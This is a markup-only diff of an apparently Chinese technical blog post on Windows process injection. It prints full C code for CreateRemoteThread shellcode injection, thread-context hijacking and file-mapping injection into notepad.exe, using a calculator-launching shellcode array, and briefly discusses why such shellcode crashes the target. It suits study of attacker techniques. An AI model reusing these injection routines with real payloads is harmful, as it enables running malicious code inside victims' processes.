-</span><span class="c1"></span>	<span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">lpBaseAddress</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">);</span>
-	<span class="n">HANDLE</span> <span class="n">hThread</span><span class="o">=</span><span class="n">CreateRemoteThread</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span><span class="n">lpBaseAddress</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
-	<span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">hThread</span><span class="p">,</span> <span class="n">INFINITE</span><span class="p">);</span>
-	<span class="c1">//注入dll
-</span><span class="c1"></span>	<span class="c1">//char path[] = &#34;C:\\Users\\kaifa\\Desktop\\1.dll&#34;;
-</span><span class="c1"></span>	<span class="c1">//WriteProcessMemory(hProcess, lpBaseAddress, path, sizeof(path), NULL);
-</span><span class="c1"></span>	<span class="c1">//LPTHREAD_START_ROUTINE pLoadlibrary = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA(&#34;kernel32.dll&#34;), &#34;LoadLibraryA&#34;);
-</span><span class="c1"></span>	<span class="c1">//CreateRemoteThread(hProcess, 0, 0, (LPTHREAD_START_ROUTINE)pLoadlibrary, lpBaseAddress, 0, 0);
-</span><span class="c1"></span>
-	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;%d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">GetLastError</span><span class="p">());</span>
-
-<span class="p">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;Windows.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;Tlhelp32.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="n">DWORD</span> <span class="nf">GetProcessIdByName</span><span class="p">(</span><span class="n">LPCTSTR</span> <span class="n">lpszProcessName</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="n">HANDLE</span> <span class="n">hSnapshot</span> <span class="o">=</span> <span class="n">CreateToolhelp32Snapshot</span><span class="p">(</span><span class="n">TH32CS_SNAPPROCESS</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">hSnapshot</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="n">PROCESSENTRY32</span> <span class="n">pe</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">pe</span><span class="p">.</span><span class="n">dwSize</span> <span class="o">=</span> <span class="k">sizeof</span> <span class="n">pe</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">Process32First</span><span class="p">(</span><span class="n">hSnapshot</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pe</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">	<span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">do</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="k">if</span> <span class="p">(</span><span class="n">lstrcmpi</span><span class="p">(</span><span class="n">lpszProcessName</span><span class="p">,</span> <span class="n">pe</span><span class="p">.</span><span class="n">szExeFile</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">			<span class="p">{</span>
+</span></span><span class="line"><span class="cl">				<span class="n">CloseHandle</span><span class="p">(</span><span class="n">hSnapshot</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">				<span class="k">return</span> <span class="n">pe</span><span class="p">.</span><span class="n">th32ProcessID</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">			<span class="p">}</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">Process32Next</span><span class="p">(</span><span class="n">hSnapshot</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pe</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="n">CloseHandle</span><span class="p">(</span><span class="n">hSnapshot</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span>
+</span></span><span class="line"><span class="cl">		<span class="s">&#34;</span><span class="se">\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">		<span class="s">&#34;</span><span class="se">\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">		<span class="s">&#34;</span><span class="se">\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">		<span class="s">&#34;</span><span class="se">\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">		<span class="s">&#34;</span><span class="se">\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">		<span class="s">&#34;</span><span class="se">\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">		<span class="s">&#34;</span><span class="se">\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">		<span class="s">&#34;</span><span class="se">\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">		<span class="s">&#34;</span><span class="se">\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">		<span class="s">&#34;</span><span class="se">\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">		<span class="s">&#34;</span><span class="se">\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">		<span class="s">&#34;</span><span class="se">\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">		<span class="s">&#34;</span><span class="se">\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">		<span class="s">&#34;</span><span class="se">\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">		<span class="s">&#34;</span><span class="se">\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">		<span class="s">&#34;</span><span class="se">\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">		<span class="s">&#34;</span><span class="se">\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">		<span class="s">&#34;</span><span class="se">\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">		<span class="s">&#34;</span><span class="se">\x63\x2e\x65\x78\x65\x00</span><span class="s">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="n">HANDLE</span> <span class="n">hProcess</span> <span class="o">=</span> <span class="n">OpenProcess</span><span class="p">(</span><span class="n">PROCESS_ALL_ACCESS</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span> <span class="n">GetProcessIdByName</span><span class="p">(</span><span class="sa">L</span><span class="s">&#34;notepad.exe&#34;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">	<span class="n">LPVOID</span> <span class="n">lpBaseAddress</span> <span class="o">=</span> <span class="n">VirtualAllocEx</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">2</span><span class="o">*</span><span class="mi">4096</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="c1">//注入shellcode 
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">lpBaseAddress</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="n">HANDLE</span> <span class="n">hThread</span><span class="o">=</span><span class="n">CreateRemoteThread</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span><span class="n">lpBaseAddress</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">hThread</span><span class="p">,</span> <span class="n">INFINITE</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="c1">//注入dll
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="c1">//char path[] = &#34;C:\\Users\\kaifa\\Desktop\\1.dll&#34;;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="c1">//WriteProcessMemory(hProcess, lpBaseAddress, path, sizeof(path), NULL);
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="c1">//LPTHREAD_START_ROUTINE pLoadlibrary = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA(&#34;kernel32.dll&#34;), &#34;LoadLibraryA&#34;);
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="c1">//CreateRemoteThread(hProcess, 0, 0, (LPTHREAD_START_ROUTINE)pLoadlibrary, lpBaseAddress, 0, 0);
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;%d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">GetLastError</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>为什么在注入calc的shellcode后会导致目标进程崩溃，但是注入cs的shellcode却不会？</p>
 <p>个人认为cs的shellcode运行后会阻塞自己(sleep)，这样会给Windows 调度其他线程的机会。所以该进程的其他线程会有机会执行。弹计算器的shellcode执行完后该线程就直接退出了。</p>
@@ -618,21 +618,21 @@
 </span><span class="lnt">14
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="n">STARTUPINFO</span> <span class="n">si</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
-<span class="n">si</span><span class="p">.</span><span class="n">cb</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">si</span><span class="p">);</span>
-<span class="n">PROCESS_INFORMATION</span> <span class="n">pi</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
-<span class="n">TCHAR</span> <span class="n">ProcessName</span><span class="p">[]</span> <span class="o">=</span> <span class="sa">L</span><span class="s">&#34;notepad&#34;</span><span class="p">;</span>
-<span class="n">CreateProcess</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">ProcessName</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">si</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pi</span><span class="p">);</span>
-<span class="n">SuspendThread</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hThread</span><span class="p">);</span>
-<span class="n">LPVOID</span> <span class="n">lpBaseAddress</span> <span class="o">=</span> <span class="n">VirtualAllocEx</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">2</span> <span class="o">*</span> <span class="mi">4096</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>
-<span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">lpBaseAddress</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">);</span>
-<span class="n">CONTEXT</span> <span class="n">ctx</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
-<span class="n">ctx</span><span class="p">.</span><span class="n">ContextFlags</span> <span class="o">=</span> <span class="n">CONTEXT_ALL</span><span class="p">;</span>
-<span class="n">GetThreadContext</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hThread</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ctx</span><span class="p">);</span>
-<span class="n">ctx</span><span class="p">.</span><span class="n">Rip</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">lpBaseAddress</span><span class="p">;</span>
-<span class="n">SetThreadContext</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hThread</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ctx</span><span class="p">);</span>
-<span class="n">ResumeThread</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hThread</span><span class="p">);</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">STARTUPINFO</span> <span class="n">si</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
+</span></span><span class="line"><span class="cl"><span class="n">si</span><span class="p">.</span><span class="n">cb</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">si</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">PROCESS_INFORMATION</span> <span class="n">pi</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
+</span></span><span class="line"><span class="cl"><span class="n">TCHAR</span> <span class="n">ProcessName</span><span class="p">[]</span> <span class="o">=</span> <span class="sa">L</span><span class="s">&#34;notepad&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">CreateProcess</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">ProcessName</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">si</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pi</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">SuspendThread</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hThread</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">LPVOID</span> <span class="n">lpBaseAddress</span> <span class="o">=</span> <span class="n">VirtualAllocEx</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">2</span> <span class="o">*</span> <span class="mi">4096</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">lpBaseAddress</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">CONTEXT</span> <span class="n">ctx</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
+</span></span><span class="line"><span class="cl"><span class="n">ctx</span><span class="p">.</span><span class="n">ContextFlags</span> <span class="o">=</span> <span class="n">CONTEXT_ALL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">GetThreadContext</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hThread</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ctx</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">ctx</span><span class="p">.</span><span class="n">Rip</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">lpBaseAddress</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">SetThreadContext</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hThread</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ctx</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">ResumeThread</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hThread</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>指令指针IP/EIP/RIP的基本作用是指向要执行的下一条指令地址。</p>
 <ol>
@@ -715,69 +715,69 @@
 </span><span class="lnt">62
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;Windows.h&gt;</span><span class="cp">
-</span><span class="cp">#include</span> <span class="cpf">&lt;Tlhelp32.h&gt;</span><span class="cp">
-</span><span class="cp">#pragma comment (lib, &#34;OneCore.lib&#34;)
-</span><span class="cp"></span><span class="n">DWORD</span> <span class="nf">GetProcessIdByName</span><span class="p">(</span><span class="n">LPCTSTR</span> <span class="n">lpszProcessName</span><span class="p">)</span>
-<span class="p">{</span>
-	<span class="n">HANDLE</span> <span class="n">hSnapshot</span> <span class="o">=</span> <span class="n">CreateToolhelp32Snapshot</span><span class="p">(</span><span class="n">TH32CS_SNAPPROCESS</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
-	<span class="k">if</span> <span class="p">(</span><span class="n">hSnapshot</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span>
-	<span class="p">{</span>
-		<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-	<span class="p">}</span>
-	<span class="n">PROCESSENTRY32</span> <span class="n">pe</span><span class="p">;</span>
-	<span class="n">pe</span><span class="p">.</span><span class="n">dwSize</span> <span class="o">=</span> <span class="k">sizeof</span> <span class="n">pe</span><span class="p">;</span>
-	<span class="k">if</span> <span class="p">(</span><span class="n">Process32First</span><span class="p">(</span><span class="n">hSnapshot</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pe</span><span class="p">))</span>
-	<span class="p">{</span>
-		<span class="k">do</span> <span class="p">{</span>
-			<span class="k">if</span> <span class="p">(</span><span class="n">lstrcmpi</span><span class="p">(</span><span class="n">lpszProcessName</span><span class="p">,</span> <span class="n">pe</span><span class="p">.</span><span class="n">szExeFile</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
-			<span class="p">{</span>
-				<span class="n">CloseHandle</span><span class="p">(</span><span class="n">hSnapshot</span><span class="p">);</span>
-				<span class="k">return</span> <span class="n">pe</span><span class="p">.</span><span class="n">th32ProcessID</span><span class="p">;</span>
-			<span class="p">}</span>
-		<span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">Process32Next</span><span class="p">(</span><span class="n">hSnapshot</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pe</span><span class="p">));</span>
-	<span class="p">}</span>
-	<span class="n">CloseHandle</span><span class="p">(</span><span class="n">hSnapshot</span><span class="p">);</span>
-	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-<span class="p">}</span>
-<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
-	<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span> 
-		<span class="s">&#34;</span><span class="se">\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52</span><span class="s">&#34;</span>
-		<span class="s">&#34;</span><span class="se">\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48</span><span class="s">&#34;</span>
-		<span class="s">&#34;</span><span class="se">\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9</span><span class="s">&#34;</span>
-		<span class="s">&#34;</span><span class="se">\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41</span><span class="s">&#34;</span>
-		<span class="s">&#34;</span><span class="se">\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48</span><span class="s">&#34;</span>
-		<span class="s">&#34;</span><span class="se">\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01</span><span class="s">&#34;</span>
-		<span class="s">&#34;</span><span class="se">\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48</span><span class="s">&#34;</span>
-		<span class="s">&#34;</span><span class="se">\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0</span><span class="s">&#34;</span>
-		<span class="s">&#34;</span><span class="se">\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c</span><span class="s">&#34;</span>
-		<span class="s">&#34;</span><span class="se">\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0</span><span class="s">&#34;</span>
-		<span class="s">&#34;</span><span class="se">\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04</span><span class="s">&#34;</span>
-		<span class="s">&#34;</span><span class="se">\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59</span><span class="s">&#34;</span>
-		<span class="s">&#34;</span><span class="se">\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48</span><span class="s">&#34;</span>
-		<span class="s">&#34;</span><span class="se">\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00</span><span class="s">&#34;</span>
-		<span class="s">&#34;</span><span class="se">\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f</span><span class="s">&#34;</span>
-		<span class="s">&#34;</span><span class="se">\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff</span><span class="s">&#34;</span>
-		<span class="s">&#34;</span><span class="se">\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb</span><span class="s">&#34;</span>
-		<span class="s">&#34;</span><span class="se">\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c</span><span class="s">&#34;</span>
-		<span class="s">&#34;</span><span class="se">\x63\x2e\x65\x78\x65\x00</span><span class="s">&#34;</span><span class="p">;</span>
-
-	<span class="c1">//申请了一段进程虚拟地址，相当于代替了VirtualAlloc，这里不需要从磁盘文件读取shellcode，所以没用到CreateFile。
-</span><span class="c1"></span>	<span class="n">HANDLE</span> <span class="n">hMapping</span> <span class="o">=</span> <span class="n">CreateFileMapping</span><span class="p">(</span><span class="n">INVALID_HANDLE_VALUE</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">);</span>
-	<span class="n">LPVOID</span> <span class="n">lpMapAddress</span> <span class="o">=</span> <span class="n">MapViewOfFile</span><span class="p">(</span><span class="n">hMapping</span><span class="p">,</span> <span class="n">FILE_MAP_WRITEs</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">));</span>
-
-	<span class="c1">//复制shellcode到分配的进程虚拟地址中，lpMapAddress为该地址空间的首地址。
-</span><span class="c1"></span>	<span class="n">memcpy</span><span class="p">((</span><span class="n">PVOID</span><span class="p">)</span><span class="n">lpMapAddress</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">));</span>
-	<span class="n">HANDLE</span> <span class="n">hProcess</span> <span class="o">=</span> <span class="n">OpenProcess</span><span class="p">(</span><span class="n">PROCESS_ALL_ACCESS</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="n">GetProcessIdByName</span><span class="p">(</span><span class="sa">L</span><span class="s">&#34;notepad.exe&#34;</span><span class="p">));</span>
-	<span class="c1">//向另一进程中写入该虚拟地址空间的内容，相当于代替WriteProcessMemory
-</span><span class="c1"></span>	<span class="n">LPVOID</span> <span class="n">lpMapAddressRemote</span> <span class="o">=</span> <span class="n">MapViewOfFile2</span><span class="p">(</span><span class="n">hMapping</span><span class="p">,</span> <span class="n">hProcess</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READ</span><span class="p">);</span>
-	<span class="c1">//创建远程线程
-</span><span class="c1"></span>	<span class="n">HANDLE</span> <span class="n">hRemoteThread</span> <span class="o">=</span> <span class="n">CreateRemoteThread</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span><span class="n">lpMapAddressRemote</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
-	<span class="n">UnmapViewOfFile</span><span class="p">(</span><span class="n">lpMapAddress</span><span class="p">);</span>
-	<span class="n">CloseHandle</span><span class="p">(</span><span class="n">hMapping</span><span class="p">);</span>
-
-<span class="p">}</span>
-</code></pre></td></tr></table></div>
